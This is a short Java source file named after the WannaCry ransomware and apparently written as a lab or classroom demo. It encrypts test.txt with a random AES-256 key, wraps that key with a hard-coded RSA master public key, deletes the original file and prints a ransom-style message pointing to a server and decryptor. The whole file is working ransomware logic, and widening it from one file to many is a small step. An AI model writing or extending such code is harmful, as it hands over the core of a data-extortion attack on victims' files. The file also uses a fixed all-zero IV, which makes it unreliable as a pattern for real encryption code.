import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.*;
import java.security.spec.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.util.Base64;

public class WannaCry {

    public static void main(String[] args) throws Exception {

        // check test.txt exists
        File inputFile = new File("test.txt");
        if (!inputFile.exists()) {
            System.out.println("test.txt not found.");
            return;
        }

        // generate AES key
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256);
        SecretKey aesKey = kg.generateKey();

        // read file bytes
        byte[] fileBytes = Files.readAllBytes(Path.of("test.txt"));

        // encrypt file using AES CBC
        Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(new byte[16]); // 16 zero bytes
        aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, iv);
        byte[] encryptedFile = aesCipher.doFinal(fileBytes);

        // save encrypted file
        FileOutputStream fos = new FileOutputStream("test.txt.cry");
        fos.write(encryptedFile);
        fos.close();

        // master RSA public key
        String masterPublicKeyBase64 =
                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpP" +
                        "qoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXd" +
                        "tcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w1" +
                        "6YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1e" +
                        "Wi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";

        // decode Base64 and rebuild public key
        byte[] decodedKey = Base64.getDecoder().decode(masterPublicKeyBase64);
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(decodedKey);
        KeyFactory kf = KeyFactory.getInstance("RSA");
        PublicKey masterPublicKey = kf.generatePublic(keySpec);

        // encrypt AES key with RSA
        Cipher rsaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        rsaCipher.init(Cipher.ENCRYPT_MODE, masterPublicKey);
        byte[] encryptedAESKey = rsaCipher.doFinal(aesKey.getEncoded());

        // save encrypted AES key
        FileOutputStream keyOut = new FileOutputStream("aes.key");
        keyOut.write(encryptedAESKey);
        keyOut.close();

        // delete  file
        new File("test.txt").delete();


        System.out.println("Dear User! Please note that your files have now been encrypted.");
        System.out.println("To recover your files please follow the instructions provided: run the server then decryptor");
    }
}
